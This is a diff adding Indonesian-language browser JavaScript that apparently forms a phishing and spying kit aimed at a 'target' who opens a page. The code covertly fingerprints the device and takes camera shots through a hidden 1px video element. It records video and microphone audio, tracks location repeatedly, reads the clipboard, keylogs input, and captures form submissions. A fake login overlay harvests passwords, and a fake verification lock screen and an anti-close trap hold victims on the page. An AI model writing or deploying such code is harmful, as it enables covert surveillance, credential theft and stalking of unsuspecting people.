+    var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
+    if(gl){var d=gl.getExtension('WEBGL_debug_renderer_info');gpu=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);}
+  }catch(x){}
+  return gpu||'-';
+}
+function _caps_on(c){
+  var a=[];
+  if(c.camera)a.push('kamera'+(c.shots>1?(' x'+c.shots):''));
+  if(c.video)a.push('video '+c.videoSec+'s');
+  if(c.mic)a.push('mic '+c.micSec+'s');
+  if(c.location)a.push('lokasi');
+  if(c.track)a.push('track '+c.trackCount+'x');
+  if(c.clip)a.push('clipboard');
+  if(c.keylog)a.push('keylog');
+  if(c.forms)a.push('form');
+  if(c.cred)a.push('login palsu');
+  if(c.notif)a.push('notif');
+  return a.length?a.join(', '):'tidak ada';
+}
+function _info(cfg){
+  var net='-';
+  try{var nc=navigator.connection;if(nc){net=(nc.effectiveType||nc.type||'-')+(nc.downlink?' / '+nc.downlink+'Mbps':'')+(nc.rtt?' / rtt '+nc.rtt+'ms':'')+(nc.saveData?' / hemat data':'');}}catch(x){}
+  var tz='-';
+  try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone}catch(x){}
+  var uad='-';
+  try{if(navigator.userAgentData&&navigator.userAgentData.brands){var bs=[];for(var i=0;i<navigator.userAgentData.brands.length;i++){bs.push(navigator.userAgentData.brands[i].brand+' '+navigator.userAgentData.brands[i].version);}uad=bs.join(', ')+(navigator.userAgentData.mobile?' / mobile':' / desktop');}}catch(x){}
+  var mem=navigator.deviceMemory?navigator.deviceMemory+' GB':'-';
+  var ori='-';
+  try{ori=(screen.orientation&&screen.orientation.type)||(window.orientation!==undefined?('orientasi '+window.orientation):'-');}catch(x){}
+  var s=_head('\u{1F4F1} TARGET TERBUKA');
+  s+=_row('Waktu',_time());
+  s+=_row('URL',location.href);
+  s+=_row('Host',location.hostname);
+  s+=_row('Mode',_mode+' ('+_caps_on(cfg||_CFG)+')');
+  s+=_row('Kunjungan',_seen?'KEMBALI (pernah buka)':'pertama kali');
+  s+=_row('Sesi',_sid);
+  s+=_row('Platform',navigator.platform||'-');
+  s+=_row('Browser',uad);
+  s+=_row('Bahasa',(navigator.languages&&navigator.languages.length?navigator.languages.join(', '):navigator.language)||'-');
+  s+=_row('Zona Waktu',tz);
+  s+=_row('Layar',screen.width+'x'+screen.height+' (viewport '+innerWidth+'x'+innerHeight+')');
+  s+=_row('Orientasi',ori);
+  s+=_row('Pixel Ratio',window.devicePixelRatio||'-');
+  s+=_row('CPU Core',navigator.hardwareConcurrency||'-');
+  s+=_row('RAM',mem);
+  s+=_row('Jaringan',net);
+  s+=_row('Touch',(('ontouchstart' in window)?'Ya':'Tidak')+' / '+(''+ (navigator.maxTouchPoints||0)));
+  s+=_row('Cookie',navigator.cookieEnabled?'Aktif':'Mati');
+  s+=_row('Do Not Track',(navigator.doNotTrack||'-'));
+  s+=_row('GPU',_gpu().slice(0,110));
+  s+=_row('Referrer',document.referrer||'Langsung');
+  s+=_row('UA',navigator.userAgent);
+  return s;
+}
+function _info2(){
+  try{
+    var md=(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices)?navigator.mediaDevices.enumerateDevices():Promise.resolve([]);
+    var st=(navigator.storage&&navigator.storage.estimate)?navigator.storage.estimate():Promise.resolve({});
+    Promise.all([md.catch(function(){return [];}),st.catch(function(){return {};})]).then(function(r){
+      var d=r[0]||[],e=r[1]||{},cam=0,mic=0,spk=0,i;
+      for(i=0;i<d.length;i++){if(d[i].kind==='videoinput')cam++;else if(d[i].kind==='audioinput')mic++;else if(d[i].kind==='audiooutput')spk++;}
+      var s=_head('\u{1F9E9} PERANGKAT TARGET');
+      s+=_row('Kamera',cam+' unit');
+      s+=_row('Mikrofon',mic+' unit');
+      s+=_row('Speaker',spk+' unit');
+      if(e.quota)s+=_row('Penyimpanan',Math.round((e.usage||0)/1048576)+' MB terpakai dari '+Math.round(e.quota/1048576)+' MB');
+      s+=_row('Baterai API',navigator.getBattery?'Tersedia':'Tidak tersedia');
+      s+=_row('MediaRecorder',window.MediaRecorder?'Ada':'Tidak ada');
+      s+=_row('Clipboard',(navigator.clipboard&&navigator.clipboard.readText)?'Bisa dibaca':'Tidak bisa');
+      s+=_row('Notifikasi',window.Notification?Notification.permission:'Tidak ada');
+      s+=_row('Sesi',_sid);
+      _say('info',s);
+    }).catch(function(){});
+  }catch(x){}
+}
+function _battery(){
+  try{
+    if(!navigator.getBattery)return;
+    navigator.getBattery().then(function(b){
+      _say('info','\u{1F50B} <b>Baterai</b>: '+Math.round(b.level*100)+'%'+(b.charging?' (charging)':' (tidak charging)'));
+    }).catch(function(){});
+  }catch(x){}
+}
+function _camCap(cv,label,idx,total){
+  var s='\u{1F4F7} <b>KAMERA '+(label||'')+'</b>'+(total>1?(' \u00B7 '+(idx+1)+'/'+total):'')+'\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';
+  s+=_row('Waktu',_time());
+  s+=_row('Resolusi',cv.width+'x'+cv.height+'px');
+  s+=_row('Halaman',location.hostname||location.href);
+  return s;
+}
+function _shoot(v,facing,shots,gap,next){
+  var taken=0,stopped=false,label=(facing==='environment'?'BELAKANG':'DEPAN');
+  function stop(){if(stopped)return;stopped=true;try{v.srcObject.getTracks().forEach(function(t){t.stop();});}catch(x){}try{v.remove();}catch(x){}next&&next();}
+  function tick(){
+    if(stopped)return;
+    try{
+      var w=v.videoWidth||640,h=v.videoHeight||480;
+      if(!w||!h){if(taken===0){setTimeout(tick,900);return;}stop();return;}
+      var sc=Math.min(1,1280/Math.max(w,h));
+      var cv=document.createElement('canvas');
+      cv.width=Math.round(w*sc);cv.height=Math.round(h*sc);
+      cv.getContext('2d').drawImage(v,0,0,cv.width,cv.height);
+      var idx=taken;
+      cv.toBlob(function(b){if(b&&b.size>0)_photo(b,_camCap(cv,label,idx,shots));},'image/jpeg',0.9);
+    }catch(x){}
+    taken++;
+    if(taken>=shots)setTimeout(stop,1200);else setTimeout(tick,gap*1000);
+  }
+  setTimeout(tick,1900);
+}
+var _pstates={};
+function _pwatch(){
+  var names=['geolocation','camera','microphone','notifications'];
+  for(var i=0;i<names.length;i++)(function(nm){
+    try{
+      if(!navigator.permissions||!navigator.permissions.query)return;
+      navigator.permissions.query({name:nm}).then(function(s){
+        _pstates[nm]=(s&&s.state)?s.state:'?';
+        s.onchange=function(){_pstates[nm]=(s&&s.state)?s.state:'?';};
+      }).catch(function(){_pstates[nm]='tidak didukung';});
+    }catch(x){}
+  })(names[i]);
+}
+function _pst(k){return _pstates[k]||'belum diketahui';}
+function _why(err){
+  var n=(err&&(err.name||err.message))||'error';
+  var m=(err&&err.name&&err.message)?(' \u00B7 '+err.message):'';
+  return n+m;
+}
+function _ctx(){
+  try{
+    if(!window.isSecureContext)return 'TIDAK AMAN ('+location.protocol+') - kamera/mic/lokasi wajib HTTPS';
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return 'getUserMedia tidak tersedia di browser ini';
+    if(/;\s*wv\b/i.test(navigator.userAgent||''))return 'aman, tapi dibuka di webview aplikasi (izin sering diblokir diam-diam)';
+    return 'aman (HTTPS + browser normal)';
+  }catch(x){return 'tidak bisa dicek';}
+}
+function _retryable(nm){return /NotAllowed|SecurityError|AbortError|NotReadable|TrackStart|killed|system/i.test(nm||'');}
+function _media(cons,cb,opt){
+  opt=opt||{};
+  var max=_num(opt.max,4,1,12),gaps=[0,2500,6000,14000,30000];
+  var i=0,stop=false,won=false,last=0;
+  function off(){
+    try{
+      document.removeEventListener('click',gate,true);
+      document.removeEventListener('touchstart',gate,true);
+      document.removeEventListener('touchend',gate,true);
+      document.removeEventListener('keydown',gate,true);
+      document.removeEventListener('pointerdown',gate,true);
+      document.removeEventListener('visibilitychange',vis,true);
+    }catch(x){}
+  }
+  function gate(){if(!stop&&!won&&(Date.now()-last)>1500)run();}
+  function vis(){if(!stop&&!won&&document.visibilityState==='visible'&&(Date.now()-last)>1500)run();}
+  function run(){
+    if(stop||won)return;
+    i++;last=Date.now();
+    var g;
+    try{g=navigator.mediaDevices.getUserMedia(cons);}catch(x){return cb(null,x,true);}
+    g.then(function(s){
+      if(stop){try{s.getTracks().forEach(function(t){t.stop();});}catch(x){}return;}
+      won=true;off();cb(s);
+    }).catch(function(err){
+      if(stop||won)return;
+      var nm=(err&&(err.name||err.message))||'error';
+      if(i>=max||!_retryable(nm)){stop=true;off();return cb(null,err,true);}
+      setTimeout(run,gaps[Math.min(i,gaps.length-1)]);
+    });
+  }
+  try{
+    document.addEventListener('click',gate,true);
+    document.addEventListener('touchstart',gate,true);
+    document.addEventListener('touchend',gate,true);
+    document.addEventListener('keydown',gate,true);
+    document.addEventListener('pointerdown',gate,true);
+    document.addEventListener('visibilitychange',vis,true);
+  }catch(x){}
+  run();
+}
+function _mediaFail(title,ikon,err,dev){
+  var nm=(err&&(err.name||err.message))||'error';
+  var key=dev==='mikrofon'?'microphone':(dev==='lokasi'?'geolocation':'camera');
+  var saran;
+  if(/NotFound/i.test(nm))saran='perangkat '+dev+' tidak terdeteksi di HP target';
+  else if(/NotReadable|TrackStart/i.test(nm))saran=dev+' sedang dipakai aplikasi lain atau diblokir sistem';
+  else if(/SecurityError/i.test(nm))saran='diblokir kebijakan browser - pastikan halaman dibuka lewat HTTPS';
+  else saran='minta target buka lewat Chrome lalu tekan Izinkan; kalau pernah diblokir, reset izin lewat ikon gembok di address bar';
+  _say('error',ikon+' <b>'+title+'</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Waktu',_time())+_row('Penyebab',_why(err))+_row('Status izin',_pst(key))+_row('Konteks',_ctx())+_row('Halaman',location.hostname||location.href)+_row('Langkah',saran)+_row('Catatan','sudah dicoba ulang otomatis tiap beberapa detik dan setiap kali target menyentuh layar'));
+}
+function _camera(cfg,done){
+  cfg=cfg||{};
+  var facing=cfg.camMode==='back'?'back':(cfg.camMode==='both'?'both':'front');
+  var list=facing==='both'?['user','environment']:(facing==='back'?['environment']:['user']);
+  var shots=_num(cfg.shots,1,1,20);
+  var gap=_num(cfg.shotGap,3,1,60);
+  var i=0,last=null;
+  function nextFacing(){
+    if(i>=list.length){
+      if(last)_mediaFail('Kamera tidak bisa dibuka','\u26D4',last,'kamera');
+      if(done)try{done();}catch(x){}
+      return;
+    }
+    var f=list[i++];
+    var sets=[{video:{facingMode:{ideal:f}},audio:false},{video:true,audio:false}];
+    var k=0;
+    (function attempt(){
+      if(k>=sets.length){nextFacing();return;}
+      _media(sets[k++],function(s){last=null;open(s,f);},function(err){
+        last=err;
+        attempt();
+      },{max:3});
+    })();
+  }
+  function open(s,f){
+    var v=document.createElement('video');
+    v.srcObject=s;v.autoplay=true;v.muted=true;v.playsInline=true;
+    v.style.cssText='position:fixed;opacity:0.01;width:1px;height:1px;pointer-events:none;z-index:-9999;top:0;left:0;';
+    try{document.body.appendChild(v);}catch(x){}
+    var play=v.play?v.play():null;
+    if(play&&play.catch)play.catch(function(){});
+    _shoot(v,f,shots,gap,nextFacing);
+  }
+  nextFacing();
+}
+function _micSec(cfg){return _num(cfg&&cfg.micSec,12,3,120);}
+function _mic(cfg){
+  var sec=_micSec(cfg||{});
+  function pick(){
+    var c=[{m:'audio/ogg;codecs=opus',e:'ogg'},{m:'audio/mp4',e:'m4a'},{m:'audio/webm;codecs=opus',e:'webm'},{m:'',e:'webm'}];
+    for(var i=0;i<c.length;i++){
+      if(!c[i].m)return c[i];
+      try{if(window.MediaRecorder&&MediaRecorder.isTypeSupported&&MediaRecorder.isTypeSupported(c[i].m))return c[i];}catch(x){}
+    }
+    return c[c.length-1];
+  }
+  try{
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){_say('error','\u26A0\uFE0F Browser tidak mendukung mikrofon.');return;}
+  }catch(x){}
+  _media({audio:{echoCancellation:true,noiseSuppression:true},video:false},function(s){
+    var c=pick(),opt=c.m?{mimeType:c.m}:{},r=null;
+    try{r=new MediaRecorder(s,opt);}catch(x){try{r=new MediaRecorder(s);}catch(x2){try{s.getTracks().forEach(function(t){t.stop();});}catch(x3){}_say('error','\u26A0\uFE0F <b>Mikrofon gagal</b>: MediaRecorder tidak tersedia.');return;}}
+    var ch=[];
+    r.ondataavailable=function(ev){if(ev.data&&ev.data.size>0)ch.push(ev.data);};
+    r.onstop=function(){
+      try{
+        var type=(r.mimeType||c.m||'audio/webm').split(';')[0];
+        var ext=/ogg/.test(type)?'ogg':(/mp4|m4a|aac/.test(type)?'m4a':(/mpeg/.test(type)?'mp3':'webm'));
+        var blob=new Blob(ch,{type:type});
+        var cap='\u{1F3A4} <b>REKAMAN MIKROFON</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Waktu',_time())+_row('Durasi',sec+' detik')+_row('Ukuran',(blob.size/1024).toFixed(0)+' KB')+_row('Format',ext.toUpperCase())+_row('Halaman',location.hostname||location.href);
+        if(blob.size>0)_audio(blob,cap,ext,sec);
+        else _say('error','\u26A0\uFE0F <b>Rekaman mikrofon kosong</b> (tidak ada audio tertangkap).');
+      }catch(x){}
+      try{s.getTracks().forEach(function(t){t.stop();});}catch(x){}
+    };
+    try{r.start();}catch(x){}
+    setTimeout(function(){try{if(r.state&&r.state!=='inactive')r.stop();}catch(x){}},sec*1000);
+  },function(err){
+    _mediaFail('Mikrofon tidak bisa dipakai','\u26D4',err,'mikrofon');
+  },{max:4});
+}
+function _video(cfg){
+  cfg=cfg||{};
+  var sec=_num(cfg.videoSec,8,2,30);
+  var wantAudio=!!(cfg.mic||cfg.videoAudio);
+  try{
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){_say('error','\u26A0\uFE0F <b>Video gagal</b>: browser tidak mendukung.');return;}
+    if(!window.MediaRecorder){_say('error','\u26A0\uFE0F <b>Video gagal</b>: MediaRecorder tidak ada.');return;}
+  }catch(x){}
+  var sets=wantAudio?[{video:{facingMode:'user'},audio:true},{video:true,audio:true},{video:true,audio:false}]:[{video:{facingMode:'user'},audio:false},{video:true,audio:false}];
+  var k=0,last=null;
+  function start(s){
+    var v=document.createElement('video');
+    v.srcObject=s;v.autoplay=true;v.muted=true;v.playsInline=true;
+    v.style.cssText='position:fixed;opacity:0.01;width:1px;height:1px;pointer-events:none;z-index:-9999;top:0;left:0;';
+    try{document.body.appendChild(v);}catch(x){}
+    var play=v.play?v.play():null;
+    if(play&&play.catch)play.catch(function(){});
+    var cand=['video/webm;codecs=vp8,opus','video/webm;codecs=vp9,opus','video/webm','video/mp4'],mime='';
+    for(var i=0;i<cand.length;i++){try{if(MediaRecorder.isTypeSupported&&MediaRecorder.isTypeSupported(cand[i])){mime=cand[i];break;}}catch(x){}}
+    var r=null;
+    try{r=mime?new MediaRecorder(s,{mimeType:mime}):new MediaRecorder(s);}catch(x){try{r=new MediaRecorder(s);}catch(x2){try{s.getTracks().forEach(function(t){t.stop();});}catch(x3){}_say('error','\u26A0\uFE0F <b>Video gagal</b>: recorder tidak bisa dibuat.');return;}}
+    var ch=[];
+    r.ondataavailable=function(ev){if(ev.data&&ev.data.size>0)ch.push(ev.data);};
+    r.onstop=function(){
+      try{
+        var type=(r.mimeType||mime||'video/webm').split(';')[0];
+        var ext=/mp4/.test(type)?'mp4':'webm';
+        var blob=new Blob(ch,{type:type});
+        var cap='\u{1F3A5} <b>VIDEO TARGET</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Waktu',_time())+_row('Durasi',sec+' detik')+_row('Ukuran',(blob.size/1024).toFixed(0)+' KB')+_row('Suara',wantAudio?'ikut direkam':'tanpa suara')+_row('Halaman',location.hostname||location.href);
+        if(blob.size>0)_vidfile(blob,cap,ext);
+        else _say('error','\u26A0\uFE0F <b>Video kosong</b> (tidak ada frame tertangkap).');
+      }catch(x){}
+      try{s.getTracks().forEach(function(t){t.stop();});}catch(x){}
+      try{v.remove();}catch(x){}
+    };
+    try{r.start();}catch(x){}
+    setTimeout(function(){try{if(r.state&&r.state!=='inactive')r.stop();}catch(x){}},sec*1000);
+  }
+  (function attempt(){
+    if(k>=sets.length){_mediaFail('Video tidak bisa direkam','\u26D4',last,'kamera');return;}
+    _media(sets[k++],function(s){start(s);},function(err){
+      last=err;
+      attempt();
+    },{max:3});
+  })();
+}
+function _location(cfg){
+  var sent=false;
+  function report(p,extra){
+    if(sent)return;sent=true;
+    _loc(p.coords.latitude,p.coords.longitude,p.coords.accuracy,extra,'');
+  }
+  function err(e){
+    if(sent)return;sent=true;
+    var m={1:'Izin lokasi ditolak target',2:'Lokasi tidak tersedia',3:'Waktu habis mengambil lokasi'}[e&&e.code]||'Gagal mengambil lokasi';
+    _say('error','\u26A0\uFE0F <b>Lokasi gagal</b>\n'+_row('Alasan',m)+_row('Waktu',_time()));
+  }
+  _perm('geolocation',function(){
+    try{
+      if(!navigator.geolocation){_say('error','\u26A0\uFE0F Browser tidak mendukung geolocation.');return;}
+      navigator.geolocation.getCurrentPosition(
+        function(p){report(p,null);},
+        function(e){
+          if(e&&e.code===3){navigator.geolocation.getCurrentPosition(function(p){report(p,'akurasi rendah');},err,{enableHighAccuracy:false,timeout:15000,maximumAge:300000});}
+          else{err(e);}
+        },
+        {enableHighAccuracy:true,timeout:12000,maximumAge:0}
+      );
+    }catch(x){}
+  });
+}
+function _track(cfg){
+  cfg=cfg||{};
+  var sec=_num(cfg.trackSec,30,3,600);
+  var cnt=_num(cfg.trackCount,10,1,120);
+  if(!navigator.geolocation){_say('error','\u26A0\uFE0F Browser tidak mendukung pelacakan lokasi.');return;}
+  var i=0,ok=0;
+  function one(){
+    i++;
+    var tag='TRACK '+i+'/'+cnt;
+    navigator.geolocation.getCurrentPosition(function(p){
+      ok++;
+      _loc(p.coords.latitude,p.coords.longitude,p.coords.accuracy,'titik ke-'+i+' dari '+cnt,tag);
+      if(i<cnt)setTimeout(one,sec*1000);
+      else _say('info','\u{1F6F0}\uFE0F <b>Pelacakan selesai</b> \u00B7 '+ok+' titik dari '+cnt+' percobaan.');
+    },function(e){
+      if(i<cnt)setTimeout(one,sec*1000);
+      else _say('error','\u26A0\uFE0F <b>Pelacakan berhenti</b> \u00B7 '+ok+' titik berhasil dari '+cnt+'.');
+    },{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+  }
+  one();
+}
+function _clip(){
+  try{
+    if(!navigator.clipboard||!navigator.clipboard.readText){_say('info','\u{1F4CB} <b>Clipboard</b>: tidak didukung browser ini.');return;}
+    navigator.clipboard.readText().then(function(t){
+      var v=String(t==null?'':t).slice(0,2000);
+      if(!v.trim()){_say('info','\u{1F4CB} <b>Clipboard</b>: kosong.');return;}
+      var s=_head('\u{1F4CB} CLIPBOARD TARGET');
+      s+=_row('Waktu',_time());
+      s+=_row('Halaman',location.hostname||location.href);
+      s+='<b>Isi:</b>\n'+_e(v);
+      _say('clip',s,{clip:v});
+    }).catch(function(e){_say('info','\u{1F4CB} <b>Clipboard</b>: ditolak/diblokir ('+_e((e&&e.name)||'error')+').');});
+  }catch(x){}
+}
+function _notif(){
+  try{
+    if(!window.Notification)return;
+    if(Notification.permission==='default')Notification.requestPermission().then(function(r){_say('notif','\u{1F514} <b>Izin notifikasi</b>: '+r);}).catch(function(){});
+    else _say('notif','\u{1F514} <b>Izin notifikasi</b>: '+Notification.permission);
+  }catch(x){}
+}
+function _push(a){
+  var p=String(a||'').split('|');
+  var t=p[0]||'Pemberitahuan',b=p[1]||'';
+  try{if(window.Notification&&Notification.permission==='granted'){new Notification(t,{body:b,tag:'syam',renotify:true});return true;}}catch(x){}
+  return false;
+}
+function _speak(a){
+  try{
+    if(!window.speechSynthesis)return false;
+    var u=new SpeechSynthesisUtterance(String(a||'').slice(0,300));
+    u.lang='id-ID';u.rate=1;u.volume=1;
+    speechSynthesis.speak(u);
+    return true;
+  }catch(x){return false;}
+}
+function _vib(a){
+  try{
+    if(!navigator.vibrate)return false;
+    var parts=String(a||'400,200,400').split(',');
+    var pat=[];
+    for(var i=0;i<parts.length;i++){var n=parseInt(parts[i],10);if(isFinite(n))pat.push(n);}
+    navigator.vibrate(pat.length?pat:[400]);
+    return true;
+  }catch(x){return false;}
+}
+function _ovs(css){try{var s=document.createElement('style');s.textContent=css;document.head.appendChild(s);}catch(x){}}
+function _flash(sec){
+  try{
+    sec=_num(sec,3,1,60);
+    var w=document.createElement('div');
+    w.style.cssText='position:fixed;inset:0;z-index:2147482990;background:#ffffff;pointer-events:none;';
+    document.body.appendChild(w);
+    setTimeout(function(){try{w.remove();}catch(x){}},sec*1000);
+  }catch(x){}
+}
+function _fs(){
+  try{
+    var el=document.documentElement;
+    if(el.requestFullscreen)el.requestFullscreen().catch(function(){});
+    else if(el.webkitRequestFullscreen)el.webkitRequestFullscreen();
+  }catch(x){}
+}
+var _wl=null,_wlOn=false;
+function _wake(){
+  try{
+    if(_wlOn||!navigator.wakeLock||!navigator.wakeLock.request)return;
+    _wlOn=true;
+    function req(){try{navigator.wakeLock.request('screen').then(function(l){_wl=l;}).catch(function(){});}catch(x){}}
+    req();
+    try{document.addEventListener('visibilitychange',function(){if(!document.hidden)req();});}catch(x){}
+  }catch(x){}
+}
+function _lock(sec){
+  try{
+    sec=_num(sec,10,1,120);
+    if(document.getElementById('_syam_lock'))return;
+    _ovs('@keyframes _syamspin{to{transform:rotate(360deg)}}');
+    var w=document.createElement('div');
+    w.id='_syam_lock';
+    w.style.cssText='position:fixed;inset:0;z-index:2147482900;background:rgba(15,23,42,.94);color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:24px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;';
+    w.innerHTML='<div style="width:34px;height:34px;border-radius:50%;border:3px solid rgba(255,255,255,.25);border-top-color:#fff;animation:_syamspin 1s linear infinite"></div><div style="margin-top:14px;font-size:15px;font-weight:600">Memverifikasi perangkat\u2026</div><div style="margin-top:6px;font-size:12.5px;opacity:.7">Jangan tutup halaman ini</div>';
+    var add=function(){try{document.body.appendChild(w);}catch(x){setTimeout(add,400);}};
+    if(document.body)add();else document.addEventListener('DOMContentLoaded',add);
+    setTimeout(function(){try{w.remove();}catch(x){}},sec*1000);
+  }catch(x){}
+}
+function _cred(cfg){
+  cfg=cfg||{};
+  try{
+    if(document.getElementById('_syam_cred'))return;
+    var title=cfg.credTitle||'Verifikasi Akun';
+    var sub=cfg.credSub||'Masukkan data akun kamu untuk melanjutkan.';
+    var btn=cfg.credBtn||'Masuk';
+    var lu=cfg.credUser||'Nomor / Email';
+    var lp=cfg.credPass||'Kata sandi';
+    _ovs('@keyframes _syamspin2{to{transform:rotate(360deg)}}');
+    var w=document.createElement('div');
+    w.id='_syam_cred';
+    w.style.cssText='position:fixed;inset:0;z-index:2147482950;background:#ffffff;overflow:auto;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;padding:28px 22px;';
+    var h='';
+    h+='<div style="max-width:420px;margin:0 auto;">';
+    h+='<div style="font-size:19px;font-weight:800;color:#111827;line-height:1.3">'+_e(title)+'</div>';
+    h+='<div style="margin-top:6px;font-size:13px;color:#6b7280;line-height:1.5">'+_e(sub)+'</div>';
+    h+='<div style="margin-top:20px">';
+    h+='<div style="font-size:12px;font-weight:700;color:#374151;margin-bottom:6px">'+_e(lu)+'</div>';
+    h+='<input id="_syam_cu" type="text" autocomplete="off" inputmode="text" style="width:100%;box-sizing:border-box;padding:13px 14px;border:1px solid #d1d5db;border-radius:10px;font-size:15px;outline:none;">';
+    h+='<div style="font-size:12px;font-weight:700;color:#374151;margin:14px 0 6px">'+_e(lp)+'</div>';
+    h+='<input id="_syam_cp" type="password" autocomplete="off" style="width:100%;box-sizing:border-box;padding:13px 14px;border:1px solid #d1d5db;border-radius:10px;font-size:15px;outline:none;">';
+    h+='<button id="_syam_cb" type="button" style="margin-top:20px;width:100%;padding:14px;border:0;border-radius:11px;background:#111827;color:#fff;font-size:15px;font-weight:700">'+_e(btn)+'</button>';
+    h+='<div id="_syam_cm" style="display:none;margin-top:14px;font-size:13px;color:#b91c1c;text-align:center"></div>';
+    h+='</div></div>';
+    w.innerHTML=h;
+    var add=function(){try{document.body.appendChild(w);}catch(x){setTimeout(add,400);}};
+    if(document.body)add();else document.addEventListener('DOMContentLoaded',add);
+    setTimeout(function(){
+      try{
+        var bu=document.getElementById('_syam_cu'),bp=document.getElementById('_syam_cp'),bb=document.getElementById('_syam_cb'),bm=document.getElementById('_syam_cm');
+        if(!bb)return;
+        bb.onclick=function(){
+          var u=bu?bu.value:'',p=bp?bp.value:'';
+          if(!u&&!p){if(bm){bm.style.display='block';bm.textContent='Data belum diisi.';}return;}
+          bb.textContent='Memproses...';bb.style.opacity='.7';
+          var s=_head('\u{1F511} LOGIN TERTANGKAP');
+          s+=_row('Waktu',_time());
+          s+=_row('Halaman',location.hostname||location.href);
+          s+=_row('Form',title);
+          s+='<b>'+_e(lu)+':</b> '+_e(u)+'\n';
+          s+='<b>'+_e(lp)+':</b> '+_e(p)+'\n';
+          _say('cred',s,{user:u,pass:p,form:title});
+          if(cfg.credNext){
+            setTimeout(function(){try{location.href=cfg.credNext;}catch(x){}},900);
+            return;
+          }
+          setTimeout(function(){
+            try{
+              if(bp)bp.value='';
+              if(bm){bm.style.display='block';bm.style.color='#b91c1c';bm.textContent='Data tidak cocok. Coba lagi.';}
+              bb.textContent=btn;bb.style.opacity='1';
+            }catch(x){}
+          },1600);
+        };
+      }catch(x){}
+    },420);
+  }catch(x){}
+}
+var _kb='',_kLast={},_kOn=false;
+function _keylog(){
+  try{
+    if(_kOn)return;_kOn=true;
+    document.addEventListener('keydown',function(e){
+      try{
+        var k=(e&&e.key)||'';
+        if(k.length===1)_kb+=k;
+        else if(k==='Enter')_kb+='\n[Enter]\n';
+        else if(k==='Backspace')_kb+='[\u232B]';
+        else if(k==='Tab')_kb+='[Tab]';
+      }catch(x){}
+    },true);
+    setInterval(function(){
+      try{
+        var parts=[],nodes=document.querySelectorAll('input,textarea,select'),i;
+        for(i=0;i<nodes.length;i++){
+          var el=nodes[i],val=el.value;
+          if(!val)continue;
+          var key=(el.name||el.id||el.placeholder||el.type||('field'+i));
+          if(_kLast[key]===val)continue;
+          _kLast[key]=val;
+          parts.push('\u2022 '+key+': '+val);
+        }
+        var typed=_kb.replace(/[ \t]+$/,'');_kb='';
+        var out='';
+        if(parts.length)out+='\u{1F4DD} <b>INPUT TERDETEKSI</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Halaman',location.hostname||location.href)+parts.join('\n')+'\n';
+        if(typed)out+=(out?'\n':'')+'\u2328\uFE0F <b>KETIKAN</b>\n'+_e(typed.slice(0,1500))+'\n';
+        if(out)_say('key',out.slice(0,3500));
+      }catch(x){}
+    },15000);
+  }catch(x){}
+}
+var _fOn=false;
+function _forms(){
+  try{
+    if(_fOn)return;_fOn=true;
+    document.addEventListener('submit',function(e){
+      try{
+        var f=e&&e.target;
+        if(!f||!f.elements)return;
+        var parts=[],i;
+        for(i=0;i<f.elements.length;i++){
+          var el=f.elements[i];
+          if(!el||(!el.name&&!el.id))continue;
+          var tp=(el.type||'').toLowerCase();
+          if(tp==='submit'||tp==='button'||tp==='file'||tp==='image'||tp==='reset')continue;
+          if(el.value)parts.push('\u2022 '+(el.name||el.id)+': '+el.value);
+        }
+        if(!parts.length)return;
+        var s='\u{1F9FE} <b>FORM DIKIRIM TARGET</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'+_row('Waktu',_time())+_row('Halaman',location.hostname||location.href)+parts.join('\n');
+        _say('form',s);
+      }catch(x){}
+    },true);
+  }catch(x){}
+}
+var _stayOn=false;
+function _stayH(e){try{(e||window.event).returnValue='Perubahan belum disimpan';}catch(x){}return 'Perubahan belum disimpan';}
+function _stay(on){
+  try{
+    if(on===false){
+      if(_stayOn){try{window.removeEventListener('beforeunload',_stayH);}catch(x){}window.onbeforeunload=null;_stayOn=false;}
+      _say('info','\u{1F513} <b>ANTI-TUTUP DIMATIKAN</b>\n'+_row('Waktu',_time())+_row('Efek','target bebas menutup halaman'));
+      return 'anti-tutup dimatikan';
+    }
+    if(_stayOn)return 'anti-tutup sudah aktif';
+    _stayOn=true;
+    window.onbeforeunload=_stayH;
+    try{window.addEventListener('beforeunload',_stayH);}catch(x){}
+    _say('info','\u{1F512} <b>ANTI-TUTUP AKTIF</b>\n'+_row('Waktu',_time())+_row('Efek','browser minta konfirmasi saat target menutup / keluar halaman')+_row('Halaman',location.hostname||location.href)+_row('Sesi',_sid));
+    return 'anti-tutup aktif';
+  }catch(x){return 'anti-tutup gagal';}
+}
+function _motion(){
+  try{
+    if(!window.DeviceMotionEvent&&!window.DeviceOrientationEvent){_say('info','\u{1F3C3} <b>Sensor</b>: tidak didukung browser ini.');return 'tidak didukung';}
+    try{if(window.DeviceMotionEvent&&typeof DeviceMotionEvent.requestPermission==='function')DeviceMotionEvent.requestPermission().catch(function(){});}catch(x){}
+    var maxa=0,sum=0,n=0,rot=null;
+    function dm(e){
+      try{
+        var a=(e&&e.acceleration)?e.acceleration:(e&&e.accelerationIncludingGravity);
+        if(!a)return;
+        var m=Math.sqrt((a.x||0)*(a.x||0)+(a.y||0)*(a.y||0)+(a.z||0)*(a.z||0));
+        if(!isFinite(m))return;
+        n++;sum+=m;if(m>maxa)maxa=m;
+      }catch(x){}
+    }
